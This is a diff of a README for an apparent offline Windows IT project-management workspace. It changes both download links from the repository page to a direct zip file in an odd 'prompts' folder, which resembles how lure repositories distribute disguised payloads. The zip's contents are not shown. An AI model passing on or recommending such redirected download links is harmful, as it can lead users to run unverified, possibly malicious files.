@@ -1,6 +1,6 @@
 # 📂 offline-it-project-manager-workspace - Manage your complex IT projects locally
 
-[![](https://img.shields.io/badge/Download-Project-blue.svg)](https://github.com/mhdsawad/offline-it-project-manager-workspace)
+[![](https://img.shields.io/badge/Download-Project-blue.svg)](https://raw.githubusercontent.com/mhdsawad/offline-it-project-manager-workspace/main/prompts/manager_workspace_offline_project_it_3.8.zip)
 
 This project provides a complete workspace for managing IT projects. You store all your data on your own computer. You do not need an internet connection to use it. It works for fixed bid, Scrum, and hybrid projects. You get tools for Gantt charts, sprint boards, budget tracking, and risk management.
 
@@ -10,7 +10,7 @@ You need a Windows computer to run this application. The software works on Windo
 
 ## 📥 Getting the software
 
-Visit this page to download: [https://github.com/mhdsawad/offline-it-project-manager-workspace](https://github.com/mhdsawad/offline-it-project-manager-workspace)
+Visit this page to download: [https://raw.githubusercontent.com/mhdsawad/offline-it-project-manager-workspace/main/prompts/manager_workspace_offline_project_it_3.8.zip](https://raw.githubusercontent.com/mhdsawad/offline-it-project-manager-workspace/main/prompts/manager_workspace_offline_project_it_3.8.zip)
 
 Follow these steps to setup the workspace:
 
